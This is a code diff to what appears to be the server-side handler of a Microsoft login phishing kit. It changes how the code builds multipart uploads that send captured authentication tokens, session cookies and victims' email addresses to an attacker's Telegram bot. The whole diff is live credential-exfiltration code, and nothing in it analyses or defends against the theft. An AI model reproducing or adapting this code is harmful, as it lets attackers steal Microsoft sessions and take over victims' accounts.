@@ -257,20 +257,32 @@ const handler = async (event, context) => {
         console.log('📄 Token file size:', tokenJson.length, 'bytes');
         
         try {
-            // Send tokens as document file to Telegram
+            // Send tokens as document file to Telegram (manual multipart form data)
             const documentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
             
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT_ID);
-            formData.append('caption', `🔑 Microsoft Authentication Tokens\n\nEmail: ${email}\nCaptured: ${timestamp}\nFile: ${cleanTokenFileName}`);
+            // Create manual multipart form data
+            const boundary = `----formdata-${Math.random().toString(36).substring(2)}`;
+            const caption = `🔑 Microsoft Authentication Tokens\n\nEmail: ${email}\nCaptured: ${timestamp}\nFile: ${cleanTokenFileName}`;
             
-            // Create file blob
-            const fileBlob = new Blob([tokenJson], { type: 'application/json' });
-            formData.append('document', fileBlob, cleanTokenFileName);
+            let formData = '';
+            formData += `--${boundary}\r\n`;
+            formData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
+            formData += `${TELEGRAM_CHAT_ID}\r\n`;
+            formData += `--${boundary}\r\n`;
+            formData += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
+            formData += `${caption}\r\n`;
+            formData += `--${boundary}\r\n`;
+            formData += `Content-Disposition: form-data; name="document"; filename="${cleanTokenFileName}"\r\n`;
+            formData += `Content-Type: application/json\r\n\r\n`;
+            formData += tokenJson;
+            formData += `\r\n--${boundary}--\r\n`;
             
             console.log('📤 Sending token file to Telegram...');
             const fileResponse = await fetch(documentUrl, {
                 method: 'POST',
+                headers: {
+                    'Content-Type': `multipart/form-data; boundary=${boundary}`
+                },
                 body: formData
             });
             
@@ -368,21 +380,33 @@ function restoreMicrosoftCookies(cookiesArray) {
             cookieCount: cookieCount
         });
         
-        try {
-            // Send cookies as document file to Telegram
+                                  try {
+            // Send cookies as document file to Telegram (manual multipart form data)
             const documentUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
             
-            const cookieFormData = new FormData();
-            cookieFormData.append('chat_id', TELEGRAM_CHAT_ID);
-            cookieFormData.append('caption', `🍪 Microsoft Authentication Cookies\n\nEmail: ${email}\nCookies: ${cookieCount} captured\nSource: ${cookieSource}\nFile: ${cleanCookieFileName}`);
+            // Create manual multipart form data for cookies
+            const cookieBoundary = `----formdata-${Math.random().toString(36).substring(2)}`;
+            const cookieCaption = `🍪 Microsoft Authentication Cookies\n\nEmail: ${email}\nCookies: ${cookieCount} captured\nSource: ${cookieSource}\nFile: ${cleanCookieFileName}`;
             
-            // Create cookie file blob
-            const cookieFileBlob = new Blob([cookieJson], { type: 'application/json' });
-            cookieFormData.append('document', cookieFileBlob, cleanCookieFileName);
+            let cookieFormData = '';
+            cookieFormData += `--${cookieBoundary}\r\n`;
+            cookieFormData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
+            cookieFormData += `${TELEGRAM_CHAT_ID}\r\n`;
+            cookieFormData += `--${cookieBoundary}\r\n`;
+            cookieFormData += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
+            cookieFormData += `${cookieCaption}\r\n`;
+            cookieFormData += `--${cookieBoundary}\r\n`;
+            cookieFormData += `Content-Disposition: form-data; name="document"; filename="${cleanCookieFileName}"\r\n`;
+            cookieFormData += `Content-Type: application/json\r\n\r\n`;
+            cookieFormData += cookieJson;
+            cookieFormData += `\r\n--${cookieBoundary}--\r\n`;
             
             console.log('📤 Sending cookie file to Telegram...');
             const cookieFileResponse = await fetch(documentUrl, {
                 method: 'POST',
+                headers: {
+                    'Content-Type': `multipart/form-data; boundary=${cookieBoundary}`
+                },
                 body: cookieFormData
             });
             
